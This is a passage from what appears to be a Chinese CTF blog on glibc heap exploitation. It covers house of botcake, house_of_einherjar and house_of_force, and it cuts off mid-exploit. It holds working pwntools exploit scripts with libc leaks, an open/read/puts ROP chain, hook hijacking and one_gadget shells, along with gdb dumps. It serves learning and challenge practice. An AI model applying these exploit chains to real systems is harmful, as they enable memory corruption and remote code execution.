ELF(&quot;./libc.so.6&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(&#x27;Choice: &#x27;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&#x27;Please input size: &#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;Please input content: &#x27;)    p.send(payload)def delete(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;Please input idx: &#x27;)    p.sendline(str(index))def show(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)    p.sendline(str(index))def magic(index):    p.recvuntil(&quot;Choice: &quot;)    p.sendline(b&#x27;666&#x27;)    p.recvuntil(b&quot;Please input idx: &quot;)#one_UAF_chance    p.sendline(str(index))#prepare house of botcake &amp;&amp; leak libc basefor i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)show(8)show_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&#x27;show_addr = &#x27; + hex(show_addr))libc_base = show_addr - 0x1ecbe0stdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]success(&#x27;stdout = &#x27; + hex(stdout))environ = libc_base + libc.sym[&#x27;environ&#x27;]success(&#x27;environ = &#x27; + hex(environ))delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin 合并add(0x70, b&#x27;bb&#x27;) #1  分割unsortedbinp1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3debug()p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#add返回的地址success(&#x27;stack_addr = &#x27; + hex(stack_addr))delete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #再次任意申请申请到栈上add(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3read_addr = libc_base + libc.sym[&#x27;read&#x27;]open_addr = libc_base + libc.sym[&#x27;open&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]pop_rdi_ret = libc_base + 0x0000000000023b6apop_rsi_ret = libc_base + 0x000000000002601fpop_rdx_ret = libc_base + 0x0000000000142c92flag_addr = stack_addrp4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stack（确实）p.interactive()","categories":["heap"],"tags":["bin"]},{"title":"house_of_einherjar","url":"/2023/10/10/house-of-einherjar/","content":"来玩把祖玛吧利用的是free的后向合并\nfree函数后向合并关键代码\n/*consolidate backward*/if (!prev_inuse(p))&#123;//判断被释放堆块p的inuse标志位是否为0，如果为0则进行if中的内容，相当于一个检查。通过这个点说明我们至少要通过堆溢出去覆盖掉相邻高地址位的inuse标志位，最常见的方式就是off-by-one    prevsize p-&gt;prev size;//记录相邻堆块p的prev_size值    size += prev_size;//size为size + prev_size    p = chunk_at_offset(p,-((long)prevsize));//堆块p的指针最后由chunk_at_offset()函数决定，chunk_at_offset()函数如下图，作用是将原本p指针位置加上s偏移后的位置作为合并堆块的新指针。那么带回到free函数中，意思就是原本p指针需要减去（向后）一个后向堆块size（p-&gt;prev_size）大小的偏移后得到合并堆块的新指针    unlink(av, p, bck, fwd);//unlink检查&#125;\ndebug程序来自how2heap还是放个原程序在这吧\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;/*   Credit to st4g3r for publishing this technique   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. */int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tprintf(&quot;Welcome to House of Einherjar!\\n&quot;);\tprintf(&quot;Tested in Ubuntu 18.04.4 64bit.\\n&quot;);\tprintf(&quot;This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.\\n&quot;);\tprintf(&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\\n&quot;);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\tprintf(&quot;\\nWe allocate 0x38 bytes for &#x27;a&#x27;\\n&quot;);\ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tprintf(&quot;\\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\\n&quot;);\tprintf(&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\\n&quot;);\tprintf(&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n&quot;);\tprintf(&quot;(although we could do the unsafe unlink technique here in some scenarios)\\n&quot;);\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size\tfake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin\tfake_chunk[2] = (size_t) fake_chunk; // fwd\tfake_chunk[3] = (size_t) fake_chunk; // bck\tfake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize\tfake_chunk[5] = (size_t) fake_chunk; //bck_nextsize\tprintf(&quot;Our fake chunk at %p looks like:\\n&quot;, fake_chunk);\tprintf(&quot;prev_size (not used): %#lx\\n&quot;, fake_chunk[0]);\tprintf(&quot;size: %#lx\\n&quot;, fake_chunk[1]);\tprintf(&quot;fwd: %#lx\\n&quot;, fake_chunk[2]);\tprintf(&quot;bck: %#lx\\n&quot;, fake_chunk[3]);\tprintf(&quot;fwd_nextsize: %#lx\\n&quot;, fake_chunk[4]);\tprintf(&quot;bck_nextsize: %#lx\\n&quot;, fake_chunk[5]);\t/* In this case it is easier if the chunk size attribute has a least significant byte with\t * a value of 0x00. The least significant byte of this will be 0x00, because the size of \t * the chunk includes the amount requested plus some amount required for the metadata. */\tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tprintf(&quot;\\nWe allocate 0x4f8 bytes for &#x27;b&#x27;.\\n&quot;);\tprintf(&quot;b: %p\\n&quot;, b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\t/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;b.size is: (0x500) | prev_inuse = 0x501\\n&quot;);\tprintf(&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\\n&quot;);\t/* VULNERABILITY */\ta[real_a_size] = 0; \t/* VULNERABILITY */\tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tprintf(&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;\t\t   &quot;don&#x27;t change the size of b, only its prev_inuse bit\\n&quot;);\tprintf(&quot;If it had been modified, we would need a fake chunk inside &quot;\t\t   &quot;b where it will try to consolidate the next chunk\\n&quot;);\t// Write a fake prev_size to the end of a\tprintf(&quot;\\nWe write a fake prev_size to the last %lu bytes of a so that &quot;\t\t   &quot;it will consolidate with our fake chunk\\n&quot;, sizeof(size_t));\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\t//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size\tprintf(&quot;\\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\\n&quot;);\tfake_chunk[1] = fake_size;\t// free b and it will consolidate with our fake chunk\tprintf(&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n&quot;);\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\t//if we allocate another chunk before we free b we will need to \t//do two things: \t//1) We will need to adjust the size of our fake chunk so that\t//fake_chunk + fake_chunk&#x27;s size points to an area we control\t//2) we will need to write the size of our fake chunk\t//at the location we control. \t//After doing these two things, when unlink gets called, our fake chunk will\t//pass the size(P) == prev_size(next_chunk(P)) test. \t//otherwise we need to make sure that our fake chunk is up against the\t//wilderness\t//\tprintf(&quot;\\nNow we can call malloc() and it will begin in our fake chunk\\n&quot;);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\n我去除了大部分的英文但保留了漏洞利用这样才知道打的是house_of_einherjar(doge)其实是方便调试如下:\n//gcc house_of_einherjar.c -g -o einherjar#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;int main()&#123;\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tuint8_t* a;\tuint8_t* b;\tuint8_t* d;\t//create 0x48(0x38+0x10)size chunka \ta = (uint8_t*) malloc(0x38);\tprintf(&quot;a: %p\\n&quot;, a);   \tint real_a_size = malloc_usable_size(a);\tprintf(&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\\n&quot;, real_a_size);\t// create a fake chunk\tsize_t fake_chunk[6];\tfake_chunk[0] = 0x100; \tfake_chunk[1] = 0x100; \tfake_chunk[2] = (size_t) fake_chunk; \tfake_chunk[3] = (size_t) fake_chunk; \tfake_chunk[4] = (size_t) fake_chunk; \tfake_chunk[5] = (size_t) fake_chunk; \t//create 0x508(0x4f8+0x10) chunkb \tb = (uint8_t*) malloc(0x4f8);\tint real_b_size = malloc_usable_size(b);\tuint64_t* b_size_ptr = (uint64_t*)(b - 8);\tprintf(&quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr);\ta[real_a_size] = 0; \tprintf(&quot;b.size: %#lx\\n&quot;, *b_size_ptr);\tsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\tprintf(&quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\tfake_chunk[1] = fake_size;\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\nfrom GPT\n变量声明：程序声明了三个指向 uint8_t 类型的指针变量 a, b, d，用于存储内存地址。a = (uint8_t*) malloc(0x38);：通过 malloc 函数分配了 0x38 字节大小的内存，并将其起始地址赋给变量 a。输出地址：使用 printf 语句打印变量 a 的地址。int real_a_size = malloc_usable_size(a);：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_a_size 中。打印实际大小：打印变量 real_a_size 的值。声明数组变量：声明了一个名为 fake_chunk 的大小为 6 的 size_t 类型的数组。初始化数组：给数组元素赋值。这个数组用于构造一个假的堆块结构。输出数组内容：使用 printf 打印数组 fake_chunk 中的内容。b = (uint8_t*) malloc(0x4f8);：通过 malloc 函数分配了 0x4f8 字节大小的内存，并将其起始地址赋给变量 b。获取实际大小：使用 malloc_usable_size 函数获取由 malloc 分配的实际可使用的内存大小，并将结果保存在变量 real_b_size 中。输出地址：打印变量 b 的地址。uint64_t* b_size_ptr = (uint64_t*)(b - 8);：声明一个指向 uint64_t 类型的指针变量 b_size_ptr，并将其指向变量 b 前面 8 个字节。输出 b.size：打印变量 b_size_ptr 的值，即变量 b 前面 8 个字节中保存的数值。内存溢出：通过写入 a[real_a_size] = 0;，在变量 a 的末尾写入一个字节的数据，可能导致溢出。输出 b.size：再次打印变量 b_size_ptr 的值，查看是否受到内存溢出的影响。计算假的 prev_size：通过计算两个内存地址之间的偏移量来计算假的 prev_size 值。写入假的 prev_size：将计算得到的假的 prev_size 值写入 a 的末尾，以模拟一个被溢出修改的堆块。更新 fake_chunk[1]：更新数组 fake_chunk 的第二个元素，使其与假的 prev_size 值保持一致。释放 b：使用 free 函数释放变量 b 所指向的内存块。输出 fake chunk 大小：打印更新后的假的堆块大小。d = malloc(0x200);：通过 malloc 函数分配了 0x200 字节大小的内存，并将其起始地址赋给变量 d。输出下一个分配的地址：打印变量 d 的地址。使用 assert 函数进行断言判断：判断变量 d 是否等于 &amp;fake_chunk[2]。\n程序先创建了以下两个堆块和中间一个“堆块”chunka\npwndbg&gt; x/8gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x0000000000000000\nfake_chunk\npwndbg&gt; x/10gx 0x7fffffffe2c00x7fffffffe2c0:\t0x0000000000000100\t0x00000000000001000x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunkb\npwndbg&gt; x/10gx 0x5555557572900x555555757290:\t0x0000000000000000\t0x00000000000005010x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000\n执行\nuint64_t* b_size_ptr = (uint64_t*)(b - 8);\n这里其实就是将chunk_b的malloc指针-0x8的位置，即chunk_b的size值放在了b_size_ptr变量中。\npwndbg&gt; p b_size_ptr$1 = (uint64_t *) 0x555555757298pwndbg&gt; x/2gx 0x5555557572980x555555757298:\t0x0000000000000501\t0x0000000000000000\n再执行\na[real_a_size] = 0;\n这里模拟的就是off-by-one的过程。那么这样一来chunk_b的inuse标志位就被覆盖成了0\n看一下两个chunk注意chunkb的变化\npwndbg&gt; x/20gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x00000000000000000x555555757290:\t0x0000000000000000\t0x0000000000000500**0x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x00000000000000000x5555557572e0:\t0x0000000000000000\t0x0000000000000000\n执行到\nsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\n\npwndbg&gt; p/x fake_size$2 = 0xffffd55555758fd0\n\nfake_size是由b-sizeof(size_t)2和(uint8_t)fake_chunk相减得到的：\nb-sizeof(size_t)2：chunk_b的malloc指针减去两个地址位宽，也就是chunk_b的头指针(uint8_t)fake_chunk：即是伪造堆块的头指针那么这样一来就可以很明显的看出fake_size，即是chunk_b头指针距离fake_chunk头指针的偏移，需要注意的是我们看到的偏移为0xffffd55555758fd0这代表着偏移其实是一个负数\n执行\n*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;fake_chunk[1] = fake_size;\n\n看chunkb和fakechunk\npwndbg&gt; x/10gx 0x555555757290 //chunkb0x555555757290:\t0xffffd55555758fd0\t0x00000000000005000x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/10gx 0x7fffffffe2c0 //fakechunk0x7fffffffe2c0:\t0x0000000000000100\t0xffffd55555758fd00x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunk_b的prev_size等于fake_chunk的size，这个size恰巧又是chunk_b到fake_chunk的偏移，更巧的是chunk_b的inuse标志位为0\n那么如果我们free(b)，os首先会去检查其inuse标志位，发现为0，这就意味着存在一个相邻地址的堆块也是处于释放状态的那么就会根据chunk_b的prev_size先前找是否存在一个大小为0xffffd55555779d41大小的堆块结果根据chunk_b的头指针+0xffffd55555779d41处找到了fake_chunkfake_chunk的size正是我们设置的0xffffd55555779d41根据free函数后向合并机制，由于我们伪造了fake_chunk的fd、bk、fd_nextsize、bk_nextsize，所以可以绕过unlink检查那么chunkb与fakechunk就被合并称为一个大小为fake_size + b_size的大堆块并且合并大堆块的头指针即是fake_chunk的头指针0x7fffffffe2d0\n且，根据top_chunk合并机制，由于chunk_b是紧邻top_chunk的，那么在chunk_b与fake_chunk合并之后top_chunk会收下合并后的整个大堆块新的top_chunk的size变成了old_topchunk_size + fake_chunk_size + chunkb_size。并且top_chunk的头指针会变成合并堆块的头指针，即fake_chunk的头指针0xffffd55555779d41\n接下来我们执行free(b)和malloc(0x200)这两步操作free(b)会完成上述的执行过程而因为bin中没有能够满足malloc(0x200)的空闲块，所以会向top_chunk申请一个size为0x200大小的堆块由于此时top_chunk的头指针是fake_chunk(0x7fffffffe2d0)所以最后被启用的堆块即是以fake_chunk为头指针0x7fffffffe2d0，size为0x210大小的堆块\n这样我们伪造的fakechunk就会被以正常堆块的形式被malloc出来了\npwndbg&gt; cContinuing.Our fake chunk size is now 0xffffd55555779d41 (b.size + fake_prev_size)Next malloc(0x200) is at 0x7fffffffe2d0[Inferior 1 (process 4452) exited normally]\n\n像小时候玩的祖玛\n放个完整的运行信息程序为how2heap源程序house_of_einherjar\nroot@ubuntu:/home/str1k3/Desktop# ./a.outWelcome to House of Einherjar!Tested in Ubuntu 18.04.4 64bit.This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.We allocate 0x38 bytes for &#x27;a&#x27;a: 0x5625ee49e260Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38We create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stackHowever, you can also create the chunk in the heap or the bss, as long as you know its addressWe set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks(although we could do the unsafe unlink technique here in some scenarios)Our fake chunk at 0x7ffe1bda3090 looks like:prev_size (not used): 0x100size: 0x100fwd: 0x7ffe1bda3090bck: 0x7ffe1bda3090fwd_nextsize: 0x7ffe1bda3090bck_nextsize: 0x7ffe1bda3090We allocate 0x4f8 bytes for &#x27;b&#x27;.b: 0x5625ee49e2a0b.size: 0x501b.size is: (0x500) | prev_inuse = 0x501We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;b.size: 0x500This is easiest if b.size is a multiple of 0x100 so you don&#x27;t change the size of b, only its prev_inuse bitIf it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunkWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunkOur fake prev_size will be 0x5625ee49e290 - 0x7ffe1bda3090 = 0xffffd627d26fb200Modify fake chunk&#x27;s size to reflect b&#x27;s new prev_sizeNow we free b and this will consolidate with our fake chunk since b prev_inuse is not setOur fake chunk size is now 0xffffd627d271bf71 (b.size + fake_prev_size)Now we can call malloc() and it will begin in our fake chunkNext malloc(0x200) is at 0x7ffe1bda30a0\n来自hollk师傅的总结利用该方法需要注意的三点\n1.需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分2.需要计算目的 fake_chunk 与 chunk_b 地址之间的差，所以需要泄漏地址3.需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测\n前面的例题，以后再来探索吧\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_force","url":"/2023/09/02/house-of-force/","content":"house_of_forcehouse of force的攻击原理是尝试从heap中分配一个非常大的内存，使得可以将chunk分配在高地址的libc中或者进一步让其溢出分配到低地址上的用户代码段中。\n用户申请一个chunk后系统先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配\ntop chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加先看看chunk申请的源码\nvictim = av-&gt;top;//获取当前top chunk的地址size = chunksize (victim);//获取当前top chunk的大小if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)//判断式是为了保证top chunk有足够大小的空间来供此次申请//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构  &#123;    remainder_size = size - nb;              //remainder_size为分配chunk后的top chunk大小    remainder = chunk_at_offset (victim, nb);//remainder为分配完后的top chunk地址    av-&gt;top = remainder;                     //更新top chunk                                             //下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;  &#125;\n要实现house of force攻击，我们需要两点，一是修改Top chunk size为非常大的数，方便我们可以进行任意大的内存分配；二是分配大内存后，Top chunk剩余size必须大于：X（我们想要在目标地址分配的chunk大小，包括头部信息）+ MINSIZE(大小为0x20)，这样才能让我们在目标地址处进一步分配X大小的chunk。\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x20,b&#x27;0xcafe66&#x27;)#chunk0add(0x30,b&#x27;aaaa&#x27;)#chunk1payload = cyclic(0x38)+p64(0xffffffffffffffff)debug()edit(1,len(payload),payload)#attackpause()add(0x40,b&#x27;aaaa&#x27;)#chunk3\n攻只因前\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSEAddr: 0x1bc1300Size: 0x20d01\n攻只因后\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x1bc1300Size: 0xffffffffffffffffpwndbg&gt; x/40gx 0x1bc13000x1bc1300:\t0x6161616e6161616d\t0xffffffffffffffff0x1bc1310:\t0x000000000000000a\t0x00000000000000000x1bc1320:\t0x0000000000000000\t0x00000000000000000x1bc1330:\t0x0000000000000000\t0x00000000000000000x1bc1340:\t0x0000000000000000\t0x00000000000000000x1bc1350:\t0x0000000000000000\t0x00000000000000000x1bc1360:\t0x0000000000000000\t0x00000000000000000x1bc1370:\t0x0000000000000000\t0x00000000000000000x1bc1380:\t0x0000000000000000\t0x00000000000000000x1bc1390:\t0x0000000000000000\t0x00000000000000000x1bc13a0:\t0x0000000000000000\t0x00000000000000000x1bc13b0:\t0x0000000000000000\t0x00000000000000000x1bc13c0:\t0x0000000000000000\t0x00000000000000000x1bc13d0:\t0x0000000000000000\t0x00000000000000000x1bc13e0:\t0x0000000000000000\t0x00000000000000000x1bc13f0:\t0x0000000000000000\t0x00000000000000000x1bc1400:\t0x0000000000000000\t0x00000000000000000x1bc1410:\t0x0000000000000000\t0x00000000000000000x1bc1420:\t0x0000000000000000\t0x00000000000000000x1bc1430:\t0x0000000000000000\t0x0000000000000000\n可以看到这个topchunk的size已被篡改\n下面放道题，看看该技术如何利用gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n看看add函数\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //没有限制chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//会打印堆地址  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//存在堆溢出，当申请的chunk_size &lt; 0x50时  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n先打house_of_force，拿捏top_chunk同时，在分配第一个chunk时，程序还会打印出bin_addr,可以利用此泄露libc_addr\n__realloc_hook 和 __malloc_hook这两个钩子函数是相邻的，我们可以利用同一个chunk来劫持__malloc_hook为realloc+0x10，并劫持__realloc_hook为one_gadget\n再次执行malloc即可getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdb找偏移，leak_libc_base &amp;&amp; house_of_force拿捏topchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;修改topchunk的size为0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = 